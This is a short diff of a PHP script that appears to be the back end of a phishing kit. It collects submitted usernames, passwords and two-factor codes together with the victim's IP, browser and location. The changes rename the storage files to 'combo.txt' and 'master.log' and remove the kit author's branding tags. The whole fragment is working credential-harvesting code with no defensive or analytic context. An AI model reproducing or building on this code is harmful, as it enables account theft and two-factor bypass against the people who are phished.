@@ -110,11 +110,9 @@ if (strpos($PublicIP, ',') !== false) {
     $PublicIP = explode(",", $PublicIP)[0];
 }
 
-$file       = '/data.dat';
-$file2      = '/data.dat';
-$file3      = '/data.dat';
-$file4      = '/data.dat';
-$file5      = '/data.dat';
+$file       = 'data.dat';
+$file1       = 'combo.txt';
+$file2       = 'master.log';
 $ip         = "" . $PublicIP;
 $uaget      = "" . $user_agent;
 $bsr        = "" . $user_browser;
@@ -157,9 +155,7 @@ if ($success == false) {
     $user       = $_POST['username'];
     $pass       = $_POST['password'];
     $code       = $_POST['code'];
-    $code2      = "[2FA][$code]";
-    $logo       = "[S-T-R|CR00K]";
-    $gitusr     = "[SWIF-T-RYNX]";
+
     $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
     $isp        = $is;
     $currency   = "" . $full_date;
